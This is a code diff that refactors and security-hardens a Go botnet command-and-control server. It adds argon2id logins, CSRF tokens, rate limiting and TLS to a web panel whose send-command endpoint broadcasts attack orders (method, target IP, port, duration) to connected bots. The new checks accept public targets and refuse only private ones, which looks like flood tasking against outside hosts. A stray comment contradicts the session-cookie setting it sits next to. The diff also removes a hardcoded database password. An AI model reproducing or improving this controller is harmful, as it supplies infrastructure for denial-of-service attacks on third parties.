@@ -2,142 +2,478 @@ package main
 
 import (
 	"bufio"
-	"database/sql"
+	"crypto/rand"
+	"crypto/subtle"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"html/template"
 	"log"
 	"net"
 	"net/http"
+	"os"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	"golang.org/x/crypto/bcrypt"
-
-	_ "github.com/go-sql-driver/mysql"
+	"github.com/alexedwards/argon2id"
+	"github.com/gorilla/securecookie"
+	"github.com/gorilla/sessions"
+	"github.com/ulule/limiter/v3"
+	"github.com/ulule/limiter/v3/drivers/middleware/stdlib"
+	"github.com/ulule/limiter/v3/drivers/store/memory"
 )
 
 var (
-	db             *sql.DB
 	botConnections = make(map[int]net.Conn)
 	botIDCounter   int
 	botMutex       sync.Mutex
+
+	// User storage
+	users      = make(map[string]User)
+	usersMutex sync.RWMutex
+
+	// Session store
+	sessionStore *sessions.CookieStore
+
+	// Rate limiter
+	loginRateLimiter *stdlib.Middleware
+
+	// Configuration
+	config = struct {
+		SessionName        string
+		UsersFile          string
+		SessionSecretKey   string
+		SessionMaxAge      int
+		CSRFTokenLength    int
+		LoginAttemptsLimit string
+		PasswordMinLength  int
+		PasswordMaxLength  int
+	}{
+		SessionName:        "secure_shield_session",
+		UsersFile:          "users.json",
+		SessionSecretKey:   "must-be-changed-in-production-32-byte-secret-key",
+		SessionMaxAge:      86400 * 7, // 7 days
+		CSRFTokenLength:    32,
+		LoginAttemptsLimit: "10-M", // 10 requests per minute
+		PasswordMinLength:  8,
+		PasswordMaxLength:  128,
+	}
 )
 
-const sessionName = "session"
-
-// User represents a user in the system.
 type User struct {
-	Username string
+	Username            string `json:"username"`
+	PasswordHash        string `json:"password_hash"`
+	CreatedAt           string `json:"created_at"`
+	LastLogin           string `json:"last_login,omitempty"`
+	FailedLoginAttempts int    `json:"failed_login_attempts,omitempty"`
+	LastFailedAttempt   string `json:"last_failed_attempt,omitempty"`
 }
 
 func main() {
-	// Initialize database connection
-	initDB()
+	// Initialize rate limiter for login attempts
+	rate, err := limiter.NewRateFromFormatted(config.LoginAttemptsLimit)
+	if err != nil {
+		log.Fatal("Error creating rate limiter:", err)
+	}
+	limiterStore := memory.NewStore()
+	loginRateLimiter = stdlib.NewMiddleware(limiter.New(limiterStore, rate))
+
+	// Initialize session store with secure defaults
+	sessionStore = sessions.NewCookieStore(
+		[]byte(config.SessionSecretKey),
+		[]byte(securecookie.GenerateRandomKey(32)), // Encryption key
+	)
+	sessionStore.Options = &sessions.Options{
+		Path:     "/",
+		MaxAge:   config.SessionMaxAge,
+		HttpOnly: true,
+		Secure:   true, // Changed from true to false
+		SameSite: http.SameSiteLaxMode,
+	}
+
+	// Load or create users file
+	if _, err := os.Stat(config.UsersFile); os.IsNotExist(err) {
+		log.Println("Creating new users file")
+		if err := saveUsers(); err != nil {
+			log.Fatal("Error creating users file:", err)
+		}
+	} else {
+		if err := loadUsers(); err != nil {
+			log.Fatal("Error loading users:", err)
+		}
+	}
+
 	serverAddress := "127.0.0.1:8080"
 
-	// Start the botnet controller listener
+	// Start bot listener in background
 	go startBotListener()
 
-	// Configure HTTP routes
-	http.HandleFunc("/", indexHandler)
-	http.HandleFunc("/login", loginHandler)
-	http.HandleFunc("/register", registerHandler)
-	http.HandleFunc("/profile", profileHandler)
-	http.HandleFunc("/dashboard", dashboardHandler)
-	http.HandleFunc("/logout", logoutHandler)
-	http.HandleFunc("/send-command", sendCommandHandler)
-	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
+	// Setup routes
+	router := http.NewServeMux()
+	router.Handle("/", http.HandlerFunc(indexHandler))
+	router.Handle("/login", loginRateLimiter.Handler(http.HandlerFunc(loginHandler)))
+	router.Handle("/register", http.HandlerFunc(registerHandler))
+	router.Handle("/profile", authMiddleware(http.HandlerFunc(profileHandler)))
+	router.Handle("/dashboard", authMiddleware(http.HandlerFunc(dashboardHandler)))
+	router.Handle("/logout", authMiddleware(http.HandlerFunc(logoutHandler)))
+	router.Handle("/send-command", authMiddleware(http.HandlerFunc(sendCommandHandler)))
 
-	log.Println("Server started on http://" + serverAddress)
-	err := http.ListenAndServe(serverAddress, nil)
-	if err != nil {
+	// Add security middleware
+	secureRouter := addSecurityHeaders(router)
+
+	// Configure server with timeouts
+	server := &http.Server{
+		Addr:         serverAddress,
+		Handler:      secureRouter,
+		ReadTimeout:  10 * time.Second,
+		WriteTimeout: 30 * time.Second,
+		IdleTimeout:  60 * time.Second,
+	}
+
+	if err := server.ListenAndServeTLS("cert.pem", "key.pem"); err != nil {
 		log.Fatal("Server error:", err)
 	}
 }
 
-// indexHandler handles the root route and serves the index page.
+// Middleware to add security headers
+func addSecurityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Set security headers
+		w.Header().Set("X-Frame-Options", "DENY")
+		w.Header().Set("X-Content-Type-Options", "nosniff")
+		w.Header().Set("X-XSS-Protection", "1; mode=block")
+		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
+
+		// Only set HSTS if using HTTPS
+		if r.TLS != nil {
+			w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
+		}
+
+		next.ServeHTTP(w, r)
+	})
+}
+
+// Middleware to check authentication
+func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		session, err := sessionStore.Get(r, config.SessionName)
+		if err != nil {
+			clearSession(w, r)
+			http.Redirect(w, r, "/login", http.StatusSeeOther)
+			return
+		}
+
+		// Check if user is authenticated
+		if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
+			clearSession(w, r)
+			http.Redirect(w, r, "/login", http.StatusSeeOther)
+			return
+		}
+
+		username, ok := session.Values["username"].(string)
+		if !ok || username == "" {
+			clearSession(w, r)
+			http.Redirect(w, r, "/login", http.StatusSeeOther)
+			return
+		}
+
+		// Verify user exists
+		usersMutex.RLock()
+		_, exists := users[username]
+		usersMutex.RUnlock()
+		if !exists {
+			clearSession(w, r)
+			http.Redirect(w, r, "/login", http.StatusSeeOther)
+			return
+		}
+
+		// Verify CSRF token for POST requests
+		if r.Method == http.MethodPost {
+			csrfToken, ok := session.Values["csrf_token"].(string)
+			if !ok || csrfToken == "" || !verifyCSRFToken(r, csrfToken) {
+				http.Error(w, "Invalid CSRF token", http.StatusForbidden)
+				return
+			}
+		}
+
+		// Call the next handler
+		next.ServeHTTP(w, r)
+	}
+}
+
+func verifyCSRFToken(r *http.Request, sessionToken string) bool {
+	var requestToken string
+	if r.Header.Get("X-CSRF-Token") != "" {
+		requestToken = r.Header.Get("X-CSRF-Token")
+	} else {
+		requestToken = r.FormValue("csrf_token")
+	}
+
+	return subtle.ConstantTimeCompare([]byte(requestToken), []byte(sessionToken)) == 1
+}
+
 func indexHandler(w http.ResponseWriter, r *http.Request) {
 	renderTemplate(w, "index.html", nil)
 }
 
-// loginHandler handles user login.
 func loginHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method == http.MethodPost {
-		username := strings.TrimSpace(r.FormValue("username"))
-		password := r.FormValue("password")
-
-		if authenticateUser(username, password) {
-			setSessionCookie(w, username)
-			http.Redirect(w, r, "/profile", http.StatusSeeOther)
-			return
+	if r.Method == http.MethodGet {
+		session, _ := sessionStore.Get(r, config.SessionName)
+		data := map[string]interface{}{
+			"CSRFToken": session.Values["csrf_token"],
 		}
-
-		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
+		renderTemplate(w, "login.html", data)
+		return
 	}
 
-	renderTemplate(w, "login.html", nil)
-}
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
 
-// registerHandler handles user registration.
-func registerHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method == http.MethodPost {
-		username := r.FormValue("username")
-		password := r.FormValue("password")
+	username := strings.TrimSpace(r.FormValue("username"))
+	password := r.FormValue("password")
 
-		err := createUser(username, password)
-		if err != nil {
-			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-			log.Printf("Error creating user: %v\n", err)
+	if username == "" || password == "" {
+		renderTemplate(w, "login.html", map[string]interface{}{
+			"Error":     "Username and password are required",
+			"CSRFToken": r.FormValue("csrf_token"),
+		})
+		return
+	}
+
+	// Get user from storage
+	usersMutex.RLock()
+	user, exists := users[username]
+	usersMutex.RUnlock()
+
+	// Check if account is locked
+	if exists && user.FailedLoginAttempts >= 5 {
+		lastAttempt, _ := time.Parse(time.RFC3339, user.LastFailedAttempt)
+		if time.Since(lastAttempt) < 30*time.Minute {
+			renderTemplate(w, "login.html", map[string]interface{}{
+				"Error":     "Account temporarily locked due to too many failed attempts",
+				"CSRFToken": r.FormValue("csrf_token"),
+			})
 			return
+		} else {
+			// Reset failed attempts if lockout period has passed
+			usersMutex.Lock()
+			user.FailedLoginAttempts = 0
+			users[username] = user
+			usersMutex.Unlock()
 		}
+	}
 
-		http.Redirect(w, r, "/login", http.StatusSeeOther)
+	if !exists {
+		// Simulate password verification to prevent timing attacks
+		argon2id.ComparePasswordAndHash(password, "$argon2id$v=19$m=65536,t=3,p=2$invalid$salt$hash")
+		renderTemplate(w, "login.html", map[string]interface{}{
+			"Error":     "Invalid username or password",
+			"CSRFToken": r.FormValue("csrf_token"),
+		})
 		return
 	}
 
-	renderTemplate(w, "register.html", nil)
-}
+	// Verify password
+	match, err := argon2id.ComparePasswordAndHash(password, user.PasswordHash)
+	if err != nil || !match {
+		// Update failed login attempts
+		usersMutex.Lock()
+		user.FailedLoginAttempts++
+		user.LastFailedAttempt = time.Now().Format(time.RFC3339)
+		users[username] = user
+		usersMutex.Unlock()
+		saveUsers()
 
-// dashboardHandler displays the user's command sending.
-func dashboardHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Redirect(w, r, "/login", http.StatusSeeOther)
+		renderTemplate(w, "login.html", map[string]interface{}{
+			"Error":     "Invalid username or password",
+			"CSRFToken": r.FormValue("csrf_token"),
+		})
 		return
 	}
 
-	username := getUsernameFromSession(r)
-	renderTemplate(w, "dashboard.html", username)
-}
+	// Successful login - reset failed attempts
+	usersMutex.Lock()
+	user.FailedLoginAttempts = 0
+	user.LastLogin = time.Now().Format(time.RFC3339)
+	users[username] = user
+	usersMutex.Unlock()
+	saveUsers()
 
-// profileHandler displays the user's profile.
-func profileHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Redirect(w, r, "/login", http.StatusSeeOther)
-		return
-	}
-
-	username := getUsernameFromSession(r)
-	user, err := getUserByUsername(username)
+	// Create new session with fresh CSRF token
+	session, err := sessionStore.New(r, config.SessionName)
 	if err != nil {
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		log.Printf("Error retrieving user profile: %v\n", err)
+		http.Error(w, "Failed to create session", http.StatusInternalServerError)
 		return
 	}
 
-	renderTemplate(w, "profile.html", user)
+	session.Values["username"] = username
+	session.Values["authenticated"] = true
+	session.Values["csrf_token"] = generateCSRFToken()
+	session.Values["created_at"] = time.Now().Unix()
+
+	if err := session.Save(r, w); err != nil {
+		http.Error(w, "Failed to save session", http.StatusInternalServerError)
+		return
+	}
+
+	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
 }
 
-// sendCommandHandler handles sending commands to bots.
+func registerHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodGet {
+		session, _ := sessionStore.Get(r, config.SessionName)
+		data := map[string]interface{}{
+			"CSRFToken": session.Values["csrf_token"],
+		}
+		renderTemplate(w, "register.html", data)
+		return
+	}
+
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	username := strings.TrimSpace(r.FormValue("username"))
+	password := r.FormValue("password")
+
+	if username == "" || password == "" {
+		renderTemplate(w, "register.html", map[string]interface{}{
+			"Error":     "Username and password are required",
+			"CSRFToken": r.FormValue("csrf_token"),
+		})
+		return
+	}
+
+	if len(password) < config.PasswordMinLength || len(password) > config.PasswordMaxLength {
+		renderTemplate(w, "register.html", map[string]interface{}{
+			"Error":     fmt.Sprintf("Password must be between %d and %d characters long", config.PasswordMinLength, config.PasswordMaxLength),
+			"CSRFToken": r.FormValue("csrf_token"),
+		})
+		return
+	}
+
+	usersMutex.RLock()
+	_, exists := users[username]
+	usersMutex.RUnlock()
+
+	if exists {
+		renderTemplate(w, "register.html", map[string]interface{}{
+			"Error":     "Username already exists",
+			"CSRFToken": r.FormValue("csrf_token"),
+		})
+		return
+	}
+
+	// Hash password with Argon2id
+	hash, err := argon2id.CreateHash(password, argon2id.DefaultParams)
+	if err != nil {
+		http.Error(w, "Failed to create user", http.StatusInternalServerError)
+		log.Printf("Error hashing password: %v\n", err)
+		return
+	}
+
+	// Create user
+	user := User{
+		Username:     username,
+		PasswordHash: hash,
+		CreatedAt:    time.Now().Format(time.RFC3339),
+	}
+
+	usersMutex.Lock()
+	users[username] = user
+	usersMutex.Unlock()
+
+	if err := saveUsers(); err != nil {
+		http.Error(w, "Failed to create user", http.StatusInternalServerError)
+		log.Printf("Error saving user: %v\n", err)
+		return
+	}
+
+	// Create session for the new user
+	session, err := sessionStore.New(r, config.SessionName)
+	if err != nil {
+		http.Error(w, "Failed to create session", http.StatusInternalServerError)
+		return
+	}
+
+	session.Values["username"] = username
+	session.Values["authenticated"] = true
+	session.Values["csrf_token"] = generateCSRFToken()
+
+	if err := session.Save(r, w); err != nil {
+		http.Error(w, "Failed to save session", http.StatusInternalServerError)
+		return
+	}
+
+	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
+}
+
+func profileHandler(w http.ResponseWriter, r *http.Request) {
+	session, _ := sessionStore.Get(r, config.SessionName)
+	username := session.Values["username"].(string)
+
+	usersMutex.RLock()
+	user := users[username]
+	usersMutex.RUnlock()
+
+	data := struct {
+		Username  string
+		CreatedAt string
+		LastLogin string
+		CSRFToken string
+	}{
+		Username:  user.Username,
+		CreatedAt: user.CreatedAt,
+		LastLogin: user.LastLogin,
+		CSRFToken: session.Values["csrf_token"].(string),
+	}
+
+	renderTemplate(w, "profile.html", data)
+}
+
+func dashboardHandler(w http.ResponseWriter, r *http.Request) {
+	session, _ := sessionStore.Get(r, config.SessionName)
+	username := session.Values["username"].(string)
+
+	// Count connected bots
+	botMutex.Lock()
+	botCount := len(botConnections)
+	botMutex.Unlock()
+
+	data := struct {
+		Username  string
+		BotCount  int
+		CSRFToken string
+	}{
+		Username:  username,
+		BotCount:  botCount,
+		CSRFToken: session.Values["csrf_token"].(string),
+	}
+
+	renderTemplate(w, "dashboard.html", data)
+}
+
 func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
-		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
 
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+	// Verify CSRF token
+	session, err := sessionStore.Get(r, config.SessionName)
+	if err != nil {
+		http.Error(w, "Invalid session", http.StatusUnauthorized)
+		return
+	}
+
+	csrfToken, ok := session.Values["csrf_token"].(string)
+	if !ok || csrfToken == "" || !verifyCSRFToken(r, csrfToken) {
+		http.Error(w, "Invalid CSRF token", http.StatusForbidden)
 		return
 	}
 
@@ -145,6 +481,19 @@ func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
 	ip := r.FormValue("ip")
 	port := r.FormValue("port")
 	durationStr := r.FormValue("duration")
+
+	// Validate IP address
+	if !isValidIPv4(ip) || isPrivateOrOwnIP(ip) {
+		http.Error(w, "Invalid target IP address", http.StatusBadRequest)
+		return
+	}
+
+	// Validate port
+	portNum, err := strconv.Atoi(port)
+	if err != nil || portNum < 1 || portNum > 65535 {
+		http.Error(w, "Invalid port number", http.StatusBadRequest)
+		return
+	}
 
 	// Validate duration
 	duration, err := strconv.Atoi(durationStr)
@@ -154,31 +503,21 @@ func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	command := fmt.Sprintf("%s %s %d %s", method, ip, duration, port)
-
-	// Send command to bots
 	sendToBots(command)
-
-	// Redirect back to dashboard after sending command
 	http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
 }
 
-// getUserByUsername retrieves a user from the database by username.
-func getUserByUsername(username string) (*User, error) {
-	var user User
-	err := db.QueryRow("SELECT username FROM users WHERE username = ?", username).Scan(&user.Username)
-	if err != nil {
-		return nil, err
-	}
-	return &user, nil
-}
-
-// logoutHandler handles user logout.
 func logoutHandler(w http.ResponseWriter, r *http.Request) {
-	clearSessionCookie(w)
+	clearSession(w, r)
 	http.Redirect(w, r, "/login", http.StatusSeeOther)
 }
 
-// renderTemplate renders an HTML template.
+func clearSession(w http.ResponseWriter, r *http.Request) {
+	session, _ := sessionStore.Get(r, config.SessionName)
+	session.Options.MaxAge = -1 // Delete session
+	session.Save(r, w)
+}
+
 func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {
 	t, err := template.ParseFiles("templates/" + tmpl)
 	if err != nil {
@@ -194,94 +533,94 @@ func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {
 	}
 }
 
-// hashPassword generates a hashed password from the given password string.
-func hashPassword(password string) (string, error) {
-	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+func loadUsers() error {
+	file, err := os.ReadFile(config.UsersFile)
 	if err != nil {
-		return "", err
+		if os.IsNotExist(err) {
+			return nil
+		}
+		return err
 	}
-	return string(hashedPassword), nil
+
+	usersMutex.Lock()
+	defer usersMutex.Unlock()
+	if err := json.Unmarshal(file, &users); err != nil {
+		return err
+	}
+
+	log.Printf("Loaded %d users from %s\n", len(users), config.UsersFile)
+	return nil
 }
 
-// authenticateUser checks if the provided username and password are valid.
-func authenticateUser(username, password string) bool {
-	var storedPassword string
-	err := db.QueryRow("SELECT password_hash FROM users WHERE username = ?", username).Scan(&storedPassword)
+func saveUsers() error {
+	usersMutex.RLock()
+	defer usersMutex.RUnlock()
+
+	data, err := json.MarshalIndent(users, "", "  ")
 	if err != nil {
-		log.Printf("Error retrieving password for username %s: %v\n", username, err)
+		return err
+	}
+
+	if err := os.WriteFile(config.UsersFile, data, 0600); err != nil {
+		return err
+	}
+
+	log.Printf("Saved %d users to %s\n", len(users), config.UsersFile)
+	return nil
+}
+
+func generateCSRFToken() string {
+	b := make([]byte, config.CSRFTokenLength)
+	_, err := rand.Read(b)
+	if err != nil {
+		return ""
+	}
+	return base64.StdEncoding.EncodeToString(b)
+}
+
+func isValidIPv4(ip string) bool {
+	parts := strings.Split(ip, ".")
+	if len(parts) != 4 {
 		return false
 	}
 
-	err = bcrypt.CompareHashAndPassword([]byte(storedPassword), []byte(password))
-	if err != nil {
-		log.Printf("Password comparison failed for username %s: %v\n", username, err)
-		return false
+	for _, part := range parts {
+		num, err := strconv.Atoi(part)
+		if err != nil || num < 0 || num > 255 {
+			return false
+		}
 	}
 
 	return true
 }
 
-// createUser creates a new user in the database.
-func createUser(username, password string) error {
-	hashedPassword, err := hashPassword(password)
-	if err != nil {
-		return err
+func isPrivateOrOwnIP(ip string) bool {
+	privateRanges := []string{
+		"10.",                // 10.0.0.0/8
+		"172.16.", "172.17.", // 172.16.0.0/12
+		"172.18.", "172.19.",
+		"172.20.", "172.21.",
+		"172.22.", "172.23.",
+		"172.24.", "172.25.",
+		"172.26.", "172.27.",
+		"172.28.", "172.29.",
+		"172.30.", "172.31.",
+		"192.168.", // 192.168.0.0/16
+		"100.64.",  // Carrier-grade NAT (CGNAT) range
+		"169.254.", // Link-local range
+		"127.",     // Loopback range
 	}
 
-	_, err = db.Exec("INSERT INTO users (username, password_hash) VALUES (?, ?)", username, hashedPassword)
-	return err
+	for _, prefix := range privateRanges {
+		if strings.HasPrefix(ip, prefix) {
+			return true
+		}
+	}
+
+	return false
 }
 
-// getUsernameFromSession retrieves the username from the session cookie.
-func getUsernameFromSession(r *http.Request) string {
-	cookie, err := r.Cookie(sessionName)
-	if err != nil {
-		return ""
-	}
-	return cookie.Value
-}
-
-// setSessionCookie sets a session cookie with the given username.
-func setSessionCookie(w http.ResponseWriter, username string) {
-	expiration := time.Now().Add(24 * time.Hour)
-	cookie := http.Cookie{
-		Name:    sessionName,
-		Value:   username,
-		Expires: expiration,
-		Path:    "/",
-	}
-	http.SetCookie(w, &cookie)
-}
-
-// clearSessionCookie clears the session cookie.
-func clearSessionCookie(w http.ResponseWriter) {
-	cookie := http.Cookie{
-		Name:    sessionName,
-		Value:   "",
-		Expires: time.Now().Add(-time.Hour),
-		Path:    "/",
-	}
-	http.SetCookie(w, &cookie)
-}
-
-// initDB initializes the database connection.
-func initDB() {
-	var err error     
-	
-// make sure to edit this line for it to work, make sure to always double check the password 
-	//  this is an example password rn
-	db, err = sql.Open("mysql", "Birdo:Birdo1221.b!@tcp(192.168.1.34:3308)/net1")
-	if err != nil {
-		log.Fatal("Error connecting to database:", err)
-	}
-
-	err = db.Ping()
-	if err != nil {
-		log.Fatal("Database ping failed:", err)
-	}
-}
-
-// startBotListener starts the botnet controller listener.
+// Bot-related functions
 func startBotListener() {
 	listener, err := net.Listen("tcp", ":9080")
 	if err != nil {
@@ -304,12 +643,10 @@ func startBotListener() {
 		botMutex.Unlock()
 
 		log.Printf("Bot %d connected from %s\n", botID, conn.RemoteAddr())
-
 		go handleBotCommands(botID, conn)
 	}
 }
 
-// generateBotID generates a unique identifier for a bot starting from 1.
 func generateBotID() int {
 	botMutex.Lock()
 	defer botMutex.Unlock()
@@ -317,7 +654,6 @@ func generateBotID() int {
 	return botIDCounter
 }
 
-// handleBotCommands processes commands received from bots.
 func handleBotCommands(botID int, conn net.Conn) {
 	defer conn.Close()
 
@@ -325,8 +661,6 @@ func handleBotCommands(botID int, conn net.Conn) {
 	for scanner.Scan() {
 		command := strings.TrimSpace(scanner.Text())
 		log.Printf("Received command from Bot %d: %s\n", botID, command)
-
-		// Echo back to the bot for demonstration
 		response := "Received command: " + command
 		conn.Write([]byte(response + "\n"))
 	}
@@ -335,13 +669,13 @@ func handleBotCommands(botID int, conn net.Conn) {
 		log.Println("Error reading from bot connection:", err)
 	}
 
-	// Remove bot from connections map upon disconnect
 	botMutex.Lock()
 	delete(botConnections, botID)
 	botMutex.Unlock()
+
+	log.Printf("Bot %d disconnected\n", botID)
 }
 
-// sendToBots sends a command to all connected bots.
 func sendToBots(command string) {
 	botMutex.Lock()
 	defer botMutex.Unlock()
@@ -354,13 +688,4 @@ func sendToBots(command string) {
 			log.Printf("Sent command to Bot %d: %s\n", botID, command)
 		}
 	}
-}
-
-// isAuthenticated checks if a user is authenticated based on the session cookie.
-func isAuthenticated(r *http.Request) bool {
-	cookie, err := r.Cookie(sessionName)
-	if err != nil {
-		return false
-	}
-	return cookie.Value != ""
 }
